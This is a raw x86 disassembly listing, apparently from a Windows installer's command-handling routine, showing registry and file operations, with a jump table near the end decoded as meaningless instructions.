  4024cb:	33 c0                	xor    %eax,%eax
  4024cd:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  4024d0:	56                   	push   %esi
  4024d1:	0f 94 c0             	sete   %al
  4024d4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4024d7:	e8 ec 39 00 00       	call   0x405ec8
  4024dc:	eb 63                	jmp    0x402541
  4024de:	88 1e                	mov    %bl,(%esi)
  4024e0:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4024e3:	eb 5c                	jmp    0x402541
  4024e5:	68 19 00 02 00       	push   $0x20019
  4024ea:	e8 1c 06 00 00       	call   0x402b0b
  4024ef:	6a 03                	push   $0x3
  4024f1:	8b f8                	mov    %eax,%edi
  4024f3:	e8 b1 05 00 00       	call   0x402aa9
  4024f8:	3b fb                	cmp    %ebx,%edi
  4024fa:	59                   	pop    %ecx
  4024fb:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  4024fe:	88 1e                	mov    %bl,(%esi)
  402500:	0f 84 16 02 00 00    	je     0x40271c
  402506:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  402509:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  40250e:	89 4d 08             	mov    %ecx,0x8(%ebp)
  402511:	74 0c                	je     0x40251f
  402513:	51                   	push   %ecx
  402514:	56                   	push   %esi
  402515:	50                   	push   %eax
  402516:	57                   	push   %edi
  402517:	ff 15 30 70 40 00    	call   *0x407030
  40251d:	eb 1c                	jmp    0x40253b
  40251f:	53                   	push   %ebx
  402520:	53                   	push   %ebx
  402521:	53                   	push   %ebx
  402522:	8d 4d 08             	lea    0x8(%ebp),%ecx
  402525:	53                   	push   %ebx
  402526:	51                   	push   %ecx
  402527:	56                   	push   %esi
  402528:	50                   	push   %eax
  402529:	57                   	push   %edi
  40252a:	ff 15 18 70 40 00    	call   *0x407018
  402530:	85 c0                	test   %eax,%eax
  402532:	74 07                	je     0x40253b
  402534:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40253b:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  402541:	57                   	push   %edi
  402542:	ff 15 24 70 40 00    	call   *0x407024
  402548:	e9 0a 04 00 00       	jmp    0x402957
  40254d:	56                   	push   %esi
  40254e:	e8 8e 39 00 00       	call   0x405ee1
  402553:	3b c3                	cmp    %ebx,%eax
  402555:	0f 84 fc 03 00 00    	je     0x402957
  40255b:	50                   	push   %eax
  40255c:	e9 c5 f9 ff ff       	jmp    0x401f26
  402561:	6a ed                	push   $0xffffffed
  402563:	e8 63 05 00 00       	call   0x402acb
  402568:	ff 75 e0             	push   -0x20(%ebp)
  40256b:	ff 75 dc             	push   -0x24(%ebp)
  40256e:	50                   	push   %eax
  40256f:	e8 8f 35 00 00       	call   0x405b03
  402574:	83 f8 ff             	cmp    $0xffffffff,%eax
  402577:	0f 84 9d 01 00 00    	je     0x40271a
  40257d:	50                   	push   %eax
  40257e:	e9 e6 ef ff ff       	jmp    0x401569
  402583:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402586:	74 14                	je     0x40259c
  402588:	33 ff                	xor    %edi,%edi
  40258a:	47                   	inc    %edi
  40258b:	57                   	push   %edi
  40258c:	e8 18 05 00 00       	call   0x402aa9
  402591:	59                   	pop    %ecx
  402592:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  402595:	a2 e8 97 40 00       	mov    %al,0x4097e8
  40259a:	eb 0f                	jmp    0x4025ab
  40259c:	6a 11                	push   $0x11
  40259e:	e8 28 05 00 00       	call   0x402acb
  4025a3:	50                   	push   %eax
  4025a4:	e8 d7 39 00 00       	call   0x405f80
  4025a9:	8b f8                	mov    %eax,%edi
  4025ab:	38 1e                	cmp    %bl,(%esi)
  4025ad:	0f 84 69 01 00 00    	je     0x40271c
  4025b3:	56                   	push   %esi
  4025b4:	e8 28 39 00 00       	call   0x405ee1
  4025b9:	57                   	push   %edi
  4025ba:	68 e8 97 40 00       	push   $0x4097e8
  4025bf:	50                   	push   %eax
  4025c0:	e8 e5 35 00 00       	call   0x405baa
  4025c5:	e9 e4 ef ff ff       	jmp    0x4015ae
  4025ca:	6a 02                	push   $0x2
  4025cc:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4025cf:	e8 d5 04 00 00       	call   0x402aa9
  4025d4:	83 f8 01             	cmp    $0x1,%eax
  4025d7:	59                   	pop    %ecx
  4025d8:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  4025db:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4025de:	0f 8c 73 03 00 00    	jl     0x402957
  4025e4:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4025e9:	3b c1                	cmp    %ecx,%eax
  4025eb:	7e 03                	jle    0x4025f0
  4025ed:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4025f0:	38 1e                	cmp    %bl,(%esi)
  4025f2:	0f 84 82 00 00 00    	je     0x40267a
  4025f8:	56                   	push   %esi
  4025f9:	88 5d 0b             	mov    %bl,0xb(%ebp)
  4025fc:	e8 e0 38 00 00       	call   0x405ee1
  402601:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  402604:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402607:	7e 71                	jle    0x40267a
  402609:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40260c:	8d 45 f3             	lea    -0xd(%ebp),%eax
  40260f:	6a 01                	push   $0x1
  402611:	50                   	push   %eax
  402612:	ff 75 d0             	push   -0x30(%ebp)
  402615:	e8 61 35 00 00       	call   0x405b7b
  40261a:	85 c0                	test   %eax,%eax
  40261c:	74 5f                	je     0x40267d
  40261e:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  402621:	75 21                	jne    0x402644
  402623:	80 7d 0b 0d          	cmpb   $0xd,0xb(%ebp)
  402627:	74 2b                	je     0x402654
  402629:	80 7d 0b 0a          	cmpb   $0xa,0xb(%ebp)
  40262d:	74 25                	je     0x402654
  40262f:	8a 45 f3             	mov    -0xd(%ebp),%al
  402632:	88 04 3e             	mov    %al,(%esi,%edi,1)
  402635:	46                   	inc    %esi
  402636:	3a c3                	cmp    %bl,%al
  402638:	88 45 0b             	mov    %al,0xb(%ebp)
  40263b:	74 40                	je     0x40267d
  40263d:	3b 75 f4             	cmp    -0xc(%ebp),%esi
  402640:	7c ca                	jl     0x40260c
  402642:	eb 39                	jmp    0x40267d
  402644:	0f b6 45 f3          	movzbl -0xd(%ebp),%eax
  402648:	50                   	push   %eax
  402649:	57                   	push   %edi
  40264a:	e8 79 38 00 00       	call   0x405ec8
  40264f:	e9 0c 03 00 00       	jmp    0x402960
  402654:	8a 45 f3             	mov    -0xd(%ebp),%al
  402657:	38 45 0b             	cmp    %al,0xb(%ebp)
  40265a:	74 0e                	je     0x40266a
  40265c:	3c 0d                	cmp    $0xd,%al
  40265e:	74 04                	je     0x402664
  402660:	3c 0a                	cmp    $0xa,%al
  402662:	75 06                	jne    0x40266a
  402664:	88 04 3e             	mov    %al,(%esi,%edi,1)
  402667:	46                   	inc    %esi
  402668:	eb 13                	jmp    0x40267d
  40266a:	6a 01                	push   $0x1
  40266c:	53                   	push   %ebx
  40266d:	6a ff                	push   $0xffffffff
  40266f:	ff 75 d0             	push   -0x30(%ebp)
  402672:	ff 15 34 71 40 00    	call   *0x407134
  402678:	eb 03                	jmp    0x40267d
  40267a:	8b 75 f8             	mov    -0x8(%ebp),%esi
  40267d:	88 1c 3e             	mov    %bl,(%esi,%edi,1)
  402680:	3b f3                	cmp    %ebx,%esi
  402682:	e9 29 ef ff ff       	jmp    0x4015b0
  402687:	38 1e                	cmp    %bl,(%esi)
  402689:	0f 84 c8 02 00 00    	je     0x402957
  40268f:	6a 02                	push   $0x2
  402691:	e8 13 04 00 00       	call   0x402aa9
  402696:	59                   	pop    %ecx
  402697:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  40269a:	ff 75 e4             	push   -0x1c(%ebp)
  40269d:	53                   	push   %ebx
  40269e:	50                   	push   %eax
  40269f:	56                   	push   %esi
  4026a0:	e8 3c 38 00 00       	call   0x405ee1
  4026a5:	50                   	push   %eax
  4026a6:	ff 15 34 71 40 00    	call   *0x407134
  4026ac:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4026af:	0f 8c a2 02 00 00    	jl     0x402957
  4026b5:	e9 43 02 00 00       	jmp    0x4028fd
  4026ba:	56                   	push   %esi
  4026bb:	e8 21 38 00 00       	call   0x405ee1
  4026c0:	3b c3                	cmp    %ebx,%eax
  4026c2:	0f 84 8f 02 00 00    	je     0x402957
  4026c8:	50                   	push   %eax
  4026c9:	ff 15 3c 71 40 00    	call   *0x40713c
  4026cf:	e9 83 02 00 00       	jmp    0x402957
  4026d4:	57                   	push   %edi
  4026d5:	e8 07 38 00 00       	call   0x405ee1
  4026da:	3b c3                	cmp    %ebx,%eax
  4026dc:	74 12                	je     0x4026f0
  4026de:	8d 8d 38 fe ff ff    	lea    -0x1c8(%ebp),%ecx
  4026e4:	51                   	push   %ecx
  4026e5:	50                   	push   %eax
  4026e6:	ff 15 2c 71 40 00    	call   *0x40712c
  4026ec:	85 c0                	test   %eax,%eax
  4026ee:	75 3f                	jne    0x40272f
  4026f0:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4026f7:	88 1e                	mov    %bl,(%esi)
  4026f9:	e9 59 02 00 00       	jmp    0x402957
  4026fe:	6a 02                	push   $0x2
  402700:	e8 c6 03 00 00       	call   0x402acb
  402705:	8d 8d 38 fe ff ff    	lea    -0x1c8(%ebp),%ecx
  40270b:	51                   	push   %ecx
  40270c:	50                   	push   %eax
  40270d:	ff 15 28 71 40 00    	call   *0x407128
  402713:	83 f8 ff             	cmp    $0xffffffff,%eax
  402716:	75 10                	jne    0x402728
  402718:	88 1f                	mov    %bl,(%edi)
  40271a:	88 1e                	mov    %bl,(%esi)
  40271c:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402723:	e9 2f 02 00 00       	jmp    0x402957
  402728:	50                   	push   %eax
  402729:	57                   	push   %edi
  40272a:	e8 99 37 00 00       	call   0x405ec8
  40272f:	8d 85 64 fe ff ff    	lea    -0x19c(%ebp),%eax
  402735:	50                   	push   %eax
  402736:	56                   	push   %esi
  402737:	e9 39 01 00 00       	jmp    0x402875
  40273c:	6a f0                	push   $0xfffffff0
  40273e:	c7 45 f4 66 fd ff ff 	movl   $0xfffffd66,-0xc(%ebp)
  402745:	e8 81 03 00 00       	call   0x402acb
  40274a:	8b f0                	mov    %eax,%esi
  40274c:	56                   	push   %esi
  40274d:	89 75 cc             	mov    %esi,-0x34(%ebp)
  402750:	e8 1a 32 00 00       	call   0x40596f
  402755:	85 c0                	test   %eax,%eax
  402757:	75 07                	jne    0x402760
  402759:	6a ed                	push   $0xffffffed
  40275b:	e8 6b 03 00 00       	call   0x402acb
  402760:	56                   	push   %esi
  402761:	e8 78 33 00 00       	call   0x405ade
  402766:	6a 02                	push   $0x2
  402768:	68 00 00 00 40       	push   $0x40000000
  40276d:	56                   	push   %esi
  40276e:	e8 90 33 00 00       	call   0x405b03
  402773:	83 f8 ff             	cmp    $0xffffffff,%eax
  402776:	89 45 08             	mov    %eax,0x8(%ebp)
  402779:	0f 84 9d 00 00 00    	je     0x40281c
  40277f:	a1 18 37 42 00       	mov    0x423718,%eax
  402784:	8b 35 58 71 40 00    	mov    0x407158,%esi
  40278a:	50                   	push   %eax
  40278b:	6a 40                	push   $0x40
  40278d:	89 45 d0             	mov    %eax,-0x30(%ebp)
  402790:	ff d6                	call   *%esi
  402792:	8b f8                	mov    %eax,%edi
  402794:	3b fb                	cmp    %ebx,%edi
  402796:	74 7b                	je     0x402813
  402798:	53                   	push   %ebx
  402799:	e8 f0 09 00 00       	call   0x40318e
  40279e:	ff 75 d0             	push   -0x30(%ebp)
  4027a1:	57                   	push   %edi
  4027a2:	e8 d1 09 00 00       	call   0x403178
  4027a7:	ff 75 e0             	push   -0x20(%ebp)
  4027aa:	6a 40                	push   $0x40
  4027ac:	ff d6                	call   *%esi
  4027ae:	8b f0                	mov    %eax,%esi
  4027b0:	3b f3                	cmp    %ebx,%esi
  4027b2:	89 75 c4             	mov    %esi,-0x3c(%ebp)
  4027b5:	74 3a                	je     0x4027f1
  4027b7:	ff 75 e0             	push   -0x20(%ebp)
  4027ba:	56                   	push   %esi
  4027bb:	53                   	push   %ebx
  4027bc:	ff 75 dc             	push   -0x24(%ebp)
  4027bf:	e8 d8 07 00 00       	call   0x402f9c
  4027c4:	eb 1e                	jmp    0x4027e4
  4027c6:	8b 0e                	mov    (%esi),%ecx
  4027c8:	8b 46 04             	mov    0x4(%esi),%eax
  4027cb:	83 c6 08             	add    $0x8,%esi
  4027ce:	51                   	push   %ecx
  4027cf:	03 c7                	add    %edi,%eax
  4027d1:	56                   	push   %esi
  4027d2:	50                   	push   %eax
  4027d3:	89 8d 7c ff ff ff    	mov    %ecx,-0x84(%ebp)
  4027d9:	e8 e0 32 00 00       	call   0x405abe
  4027de:	03 b5 7c ff ff ff    	add    -0x84(%ebp),%esi
  4027e4:	38 1e                	cmp    %bl,(%esi)
  4027e6:	75 de                	jne    0x4027c6
  4027e8:	ff 75 c4             	push   -0x3c(%ebp)
  4027eb:	ff 15 5c 71 40 00    	call   *0x40715c
  4027f1:	ff 75 d0             	push   -0x30(%ebp)
  4027f4:	57                   	push   %edi
  4027f5:	ff 75 08             	push   0x8(%ebp)
  4027f8:	e8 ad 33 00 00       	call   0x405baa
  4027fd:	57                   	push   %edi
  4027fe:	ff 15 5c 71 40 00    	call   *0x40715c
  402804:	53                   	push   %ebx
  402805:	53                   	push   %ebx
  402806:	ff 75 08             	push   0x8(%ebp)
  402809:	6a ff                	push   $0xffffffff
  40280b:	e8 8c 07 00 00       	call   0x402f9c
  402810:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402813:	ff 75 08             	push   0x8(%ebp)
  402816:	ff 15 14 71 40 00    	call   *0x407114
  40281c:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  40281f:	6a f3                	push   $0xfffffff3
  402821:	5e                   	pop    %esi
  402822:	7d 13                	jge    0x402837
  402824:	6a ef                	push   $0xffffffef
  402826:	5e                   	pop    %esi
  402827:	ff 75 cc             	push   -0x34(%ebp)
  40282a:	ff 15 30 71 40 00    	call   *0x407130
  402830:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402837:	56                   	push   %esi
  402838:	e9 00 fa ff ff       	jmp    0x40223d
  40283d:	53                   	push   %ebx
  40283e:	e8 66 02 00 00       	call   0x402aa9
  402843:	3b 05 4c 37 42 00    	cmp    0x42374c,%eax
  402849:	59                   	pop    %ecx
  40284a:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40284d:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  402850:	0f 83 c6 fe ff ff    	jae    0x40271c
  402856:	8b f0                	mov    %eax,%esi
  402858:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40285b:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  402861:	03 35 48 37 42 00    	add    0x423748,%esi
  402867:	3b c3                	cmp    %ebx,%eax
  402869:	7c 17                	jl     0x402882
  40286b:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  40286e:	75 0f                	jne    0x40287f
  402870:	83 c6 18             	add    $0x18,%esi
  402873:	56                   	push   %esi
  402874:	57                   	push   %edi
  402875:	e8 f0 36 00 00       	call   0x405f6a
  40287a:	e9 d8 00 00 00       	jmp    0x402957
  40287f:	51                   	push   %ecx
  402880:	eb 7c                	jmp    0x4028fe
  402882:	83 c9 ff             	or     $0xffffffff,%ecx
  402885:	2b c8                	sub    %eax,%ecx
  402887:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  40288a:	74 10                	je     0x40289c
  40288c:	6a 01                	push   $0x1
  40288e:	e8 16 02 00 00       	call   0x402aa9
  402893:	59                   	pop    %ecx
  402894:	89 55 cc             	mov    %edx,-0x34(%ebp)
  402897:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40289a:	eb 10                	jmp    0x4028ac
  40289c:	ff 75 e8             	push   -0x18(%ebp)
  40289f:	8d 46 18             	lea    0x18(%esi),%eax
  4028a2:	50                   	push   %eax
  4028a3:	e8 e4 36 00 00       	call   0x405f8c
  4028a8:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  4028ac:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4028af:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4028b2:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  4028b5:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4028b8:	0f 84 99 00 00 00    	je     0x402957
  4028be:	ff 75 c0             	push   -0x40(%ebp)
  4028c1:	e8 b7 e8 ff ff       	call   0x40117d
  4028c6:	e9 8c 00 00 00       	jmp    0x402957
  4028cb:	53                   	push   %ebx
  4028cc:	e8 d8 01 00 00       	call   0x402aa9
  4028d1:	83 f8 20             	cmp    $0x20,%eax
  4028d4:	59                   	pop    %ecx
  4028d5:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  4028d8:	0f 83 3e fe ff ff    	jae    0x40271c
  4028de:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4028e1:	74 23                	je     0x402906
  4028e3:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4028e6:	74 0f                	je     0x4028f7
  4028e8:	50                   	push   %eax
  4028e9:	e8 ab e9 ff ff       	call   0x401299
  4028ee:	53                   	push   %ebx
  4028ef:	53                   	push   %ebx
  4028f0:	e8 fa e8 ff ff       	call   0x4011ef
  4028f5:	eb 60                	jmp    0x402957
  4028f7:	53                   	push   %ebx
  4028f8:	e8 e5 e9 ff ff       	call   0x4012e2
  4028fd:	50                   	push   %eax
  4028fe:	57                   	push   %edi
  4028ff:	e8 c4 35 00 00       	call   0x405ec8
  402904:	eb 51                	jmp    0x402957
  402906:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  402909:	74 12                	je     0x40291d
  40290b:	8b 15 14 37 42 00    	mov    0x423714,%edx
  402911:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402914:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  40291b:	eb 3a                	jmp    0x402957
  40291d:	8b 0d 14 37 42 00    	mov    0x423714,%ecx
  402923:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  40292a:	57                   	push   %edi
  40292b:	e8 5c 36 00 00       	call   0x405f8c
  402930:	eb 25                	jmp    0x402957
  402932:	8b 0d 08 0d 42 00    	mov    0x420d08,%ecx
  402938:	53                   	push   %ebx
  402939:	23 c8                	and    %eax,%ecx
  40293b:	51                   	push   %ecx
  40293c:	6a 0b                	push   $0xb
  40293e:	ff 75 f8             	push   -0x8(%ebp)
  402941:	ff 15 00 72 40 00    	call   *0x407200
  402947:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  40294a:	74 0b                	je     0x402957
  40294c:	53                   	push   %ebx
  40294d:	53                   	push   %ebx
  40294e:	ff 75 f8             	push   -0x8(%ebp)
  402951:	ff 15 fc 71 40 00    	call   *0x4071fc
  402957:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40295a:	01 05 a8 37 42 00    	add    %eax,0x4237a8
  402960:	33 c0                	xor    %eax,%eax
  402962:	5f                   	pop    %edi
  402963:	5e                   	pop    %esi
  402964:	5b                   	pop    %ebx
  402965:	c9                   	leave
  402966:	c2 04 00             	ret    $0x4
  402969:	62 29                	bound  %ebp,(%ecx)
  40296b:	40                   	inc    %eax
  40296c:	00 90 14 40 00 9c    	add    %dl,-0x63ffbfec(%eax)
  402972:	14 40                	adc    $0x40,%al
  402974:	00 b7 14 40 00 ca    	add    %dh,-0x35ffbfec(%edi)
  40297a:	14 40                	adc    $0x40,%al
  40297c:	00 d6                	add    %dl,%dh
  40297e:	14 40                	adc    $0x40,%al
  402980:	00 f4                	add    %dh,%ah
  402982:	14 40                	adc    $0x40,%al
  402984:	00 6f 15             	add    %ch,0x15(%edi)
  402987:	40                   	inc    %eax
  402988:	00 9d 15 40 00 bb    	add    %bl,-0x44ffbfeb(%ebp)
  40298e:	15 40 00 59 16       	adc    $0x16590040,%eax
  402993:	40                   	inc    %eax
  402994:	00 02                	add    %al,(%edx)
  402996:	15 40 00 41 15       	adc    $0x15410040,%eax
  40299b:	40                   	inc    %eax
  40299c:	00 62 15             	add    %ah,0x15(%edx)
  40299f:	40                   	inc    %eax
  4029a0:	00 6a 16             	add    %ch,0x16(%edx)
  4029a3:	40                   	inc    %eax
  4029a4:	00 bb 16 40 00 1f    	add    %bh,0x1f004016(%ebx)
  4029aa:	17                   	pop    %ss
  4029ab:	40                   	inc    %eax
  4029ac:	00 46 17             	add    %al,0x17(%esi)
  4029af:	40                   	inc    %eax
  4029b0:	00 59 17             	add    %bl,0x17(%ecx)
  4029b3:	40                   	inc    %eax
  4029b4:	00 fd                	add    %bh,%ch
  4029b6:	18 40 00             	sbb    %al,0x0(%eax)
  4029b9:	00 19                	add    %bl,(%ecx)
  4029bb:	40                   	inc    %eax
  4029bc:	00 32                	add    %dh,(%edx)
  4029be:	19 40 00             	sbb    %eax,0x0(%eax)
  4029c1:	47                   	inc    %edi
  4029c2:	19 40 00             	sbb    %eax,0x0(%eax)
  4029c5:	59                   	pop    %ecx
  4029c6:	19 40 00             	sbb    %eax,0x0(%eax)
  4029c9:	ed                   	in     (%dx),%eax
  4029ca:	19 40 00             	sbb    %eax,0x0(%eax)
  4029cd:	1e                   	push   %ds
  4029ce:	1a 40 00             	sbb    0x0(%eax),%al
  4029d1:	5e                   	pop    %esi
  4029d2:	1a 40 00             	sbb    0x0(%eax),%al
  4029d5:	9e                   	sahf
  4029d6:	1a 40 00             	sbb    0x0(%eax),%al
  4029d9:	3f                   	aas
  4029da:	1b 40 00             	sbb    0x0(%eax),%eax
  4029dd:	63 1b                	arpl   %ebx,(%ebx)
  4029df:	40                   	inc    %eax
  4029e0:	00 0a                	add    %cl,(%edx)
  4029e2:	1c 40                	sbb    $0x40,%al
  4029e4:	00 0a                	add    %cl,(%edx)
  4029e6:	1c 40                	sbb    $0x40,%al
  4029e8:	00 da                	add    %bl,%dl
  4029ea:	1c 40                	sbb    $0x40,%al
  4029ec:	00 fb                	add    %bh,%bl
  4029ee:	1c 40                	sbb    $0x40,%al
  4029f0:	00 20                	add    %ah,(%eax)
  4029f2:	1d 40 00 41 1d       	sbb    $0x1d410040,%eax
  4029f7:	40                   	inc    %eax
  4029f8:	00 9b 1d 40 00 2b    	add    %bl,0x2b00401d(%ebx)
  4029fe:	1e                   	push   %ds
  4029ff:	40                   	inc    %eax
  402a00:	00 5f 1e             	add    %bl,0x1e(%edi)
  402a03:	40                   	inc    %eax
  402a04:	00 e1                	add    %ah,%cl
  402a06:	1e                   	push   %ds
  402a07:	40                   	inc    %eax
  402a08:	00 31                	add    %dh,(%ecx)
  402a0a:	1f                   	pop    %ds
  402a0b:	40                   	inc    %eax
  402a0c:	00 61 1f             	add    %ah,0x1f(%ecx)
  402a0f:	40                   	inc    %eax
  402a10:	00 02                	add    %al,(%edx)
  402a12:	20 40 00             	and    %al,0x0(%eax)
  402a15:	d1 20                	shll   $1,(%eax)
  402a17:	40                   	inc    %eax
  402a18:	00 4b 22             	add    %cl,0x22(%ebx)
  402a1b:	40                   	inc    %eax
  402a1c:	00 cd                	add    %cl,%ch
  402a1e:	22 40 00             	and    0x0(%eax),%al
  402a21:	fc                   	cld
  402a22:	22 40 00             	and    0x0(%eax),%al
  402a25:	40                   	inc    %eax
  402a26:	23 40 00             	and    0x0(%eax),%eax
  402a29:	81 23 40 00 d6 23    	andl   $0x23d60040,(%ebx)
  402a2f:	40                   	inc    %eax
  402a30:	00 73 24             	add    %dh,0x24(%ebx)
  402a33:	40                   	inc    %eax
  402a34:	00 e5                	add    %ah,%ch
  402a36:	24 40                	and    $0x40,%al
  402a38:	00 4d 25             	add    %cl,0x25(%ebp)
  402a3b:	40                   	inc    %eax
  402a3c:	00 61 25             	add    %ah,0x25(%ecx)
  402a3f:	40                   	inc    %eax
  402a40:	00 83 25 40 00 ca    	add    %al,-0x35ffbfdb(%ebx)
  402a46:	25 40 00 87 26       	and    $0x26870040,%eax
  402a4b:	40                   	inc    %eax
  402a4c:	00 ba 26 40 00 d4    	add    %bh,-0x2bffbfda(%edx)
  402a52:	26 40                	es inc %eax
  402a54:	00 fe                	add    %bh,%dh
  402a56:	26 40                	es inc %eax
  402a58:	00 3c 27             	add    %bh,(%edi,%eiz,1)
  402a5b:	40                   	inc    %eax
  402a5c:	00 3d 28 40 00 cb    	add    %bh,0xcb004028
  402a62:	28 40 00             	sub    %al,0x0(%eax)
  402a65:	57                   	push   %edi
  402a66:	29 40 00             	sub    %eax,0x0(%eax)
  402a69:	57                   	push   %edi
  402a6a:	29 40 00             	sub    %eax,0x0(%eax)
  402a6d:	32 29                	xor    (%ecx),%ch
  402a6f:	40                   	inc    %eax
  402a70:	00 ca                	add    %cl,%dl
  402a72:	1a 40 00             	sbb    0x0(%eax),%al
  402a75:	ce                   	into
  402a76:	1a 40 00             	sbb    0x0(%eax),%al
  402a79:	d2 1a                	rcrb   %cl,(%edx)
  402a7b:	40                   	inc    %eax
  402a7c:	00 d7                	add    %dl,%bh
  402a7e:	1a 40 00             	sbb    0x0(%eax),%al
  402a81:	e4 1a                	in     $0x1a,%al
  402a83:	40                   	inc    %eax
  402a84:	00 e8                	add    %ch,%al
  402a86:	1a 40 00             	sbb    0x0(%eax),%al
  402a89:	ec                   	in     (%dx),%al
  402a8a:	1a 40 00             	sbb    0x0(%eax),%al
  402a8d:	f2 1a 40 00          	repnz sbb 0x0(%eax),%al
  402a91:	fb                   	sti
  402a92:	1a 40 00             	sbb    0x0(%eax),%al
  402a95:	05 1b 40 00 12       	add    $0x1200401b,%eax
  402a9a:	1b 40 00             	sbb    0x0(%eax),%eax
  402a9d:	2a 1b                	sub    (%ebx),%bl
  402a9f:	40                   	inc    %eax
  402aa0:	00 2e                	add    %ch,(%esi)
  402aa2:	1b 40 00             	sbb    0x0(%eax),%eax
  402aa5:	32 1b                	xor    (%ebx),%bl
  402aa7:	40                   	inc    %eax
  402aa8:	00 8b 44 24 04 8b    	add    %cl,-0x74fbdbbc(%ebx)
  402aae:	0d 24 a8 40 00       	or     $0x40a824,%eax
  402ab3:	56                   	push   %esi
  402ab4:	ff 34 81             	push   (%ecx,%eax,4)
  402ab7:	6a 00                	push   $0x0
  402ab9:	e8 ce 34 00 00       	call   0x405f8c
  402abe:	8b f0                	mov    %eax,%esi
  402ac0:	56                   	push   %esi
  402ac1:	e8 1b 34 00 00       	call   0x405ee1
  402ac6:	0f be 16             	movsbl (%esi),%edx
  402ac9:	5e                   	pop    %esi
  402aca:	c3                   	ret
  402acb:	56                   	push   %esi
  402acc:	8b 74 24 08          	mov    0x8(%esp),%esi
  402ad0:	85 f6                	test   %esi,%esi
  402ad2:	57                   	push   %edi
  402ad3:	8b c6                	mov    %esi,%eax
  402ad5:	7d 02                	jge    0x402ad9
  402ad7:	f7 d8                	neg    %eax
  402ad9:	8b 15 24 a8 40 00    	mov    0x40a824,%edx
  402adf:	8b c8                	mov    %eax,%ecx
  402ae1:	83 e1 0f             	and    $0xf,%ecx
  402ae4:	c1 f8 04             	sar    $0x4,%eax
  402ae7:	ff 34 8a             	push   (%edx,%ecx,4)
  402aea:	c1 e0 0a             	shl    $0xa,%eax
  402aed:	05 e8 93 40 00       	add    $0x4093e8,%eax
  402af2:	50                   	push   %eax
  402af3:	e8 94 34 00 00       	call   0x405f8c
  402af8:	85 f6                	test   %esi,%esi
  402afa:	8b f8                	mov    %eax,%edi
  402afc:	7d 06                	jge    0x402b04
  402afe:	57                   	push   %edi
  402aff:	e8 d0 36 00 00       	call   0x4061d4
  402b04:	8b c7                	mov    %edi,%eax
  402b06:	5f                   	pop    %edi
  402b07:	5e                   	pop    %esi
  402b08:	c2 04 00             	ret    $0x4
  402b0b:	55                   	push   %ebp
  402b0c:	8b ec                	mov    %esp,%ebp
  402b0e:	8d 45 08             	lea    0x8(%ebp),%eax
  402b11:	50                   	push   %eax
  402b12:	8b 45 08             	mov    0x8(%ebp),%eax
  402b15:	0d 20 00 10 00       	or     $0x100020,%eax
  402b1a:	50                   	push   %eax
  402b1b:	6a 22                	push   $0x22
  402b1d:	e8 a9 ff ff ff       	call   0x402acb
  402b22:	50                   	push   %eax
  402b23:	a1 24 a8 40 00       	mov    0x40a824,%eax
  402b28:	ff 70 04             	push   0x4(%eax)
  402b2b:	e8 13 00 00 00       	call   0x402b43
  402b30:	50                   	push   %eax
  402b31:	e8 ba 32 00 00       	call   0x405df0
  402b36:	f7 d8                	neg    %eax
  402b38:	1b c0                	sbb    %eax,%eax
  402b3a:	f7 d0                	not    %eax
  402b3c:	23 45 08             	and    0x8(%ebp),%eax
  402b3f:	5d                   	pop    %ebp
  402b40:	c2 04 00             	ret    $0x4
  402b43:	8b 44 24 04          	mov    0x4(%esp),%eax
  402b47:	85 c0                	test   %eax,%eax
  402b49:	7c 0d                	jl     0x402b58
  402b4b:	8b 0d a4 37 42 00    	mov    0x4237a4,%ecx
  402b51:	8d 84 01 01 00 00 80 	lea    -0x7fffffff(%ecx,%eax,1),%eax
  402b58:	c2 04 00             	ret    $0x4
  402b5b:	55                   	push   %ebp
  402b5c:	8b ec                	mov    %esp,%ebp
  402b5e:	8d 45 10             	lea    0x10(%ebp),%eax
  402b61:	50                   	push   %eax
  402b62:	8b 45 10             	mov    0x10(%ebp),%eax
  402b65:	0d 20 00 10 00       	or     $0x100020,%eax
  402b6a:	50                   	push   %eax
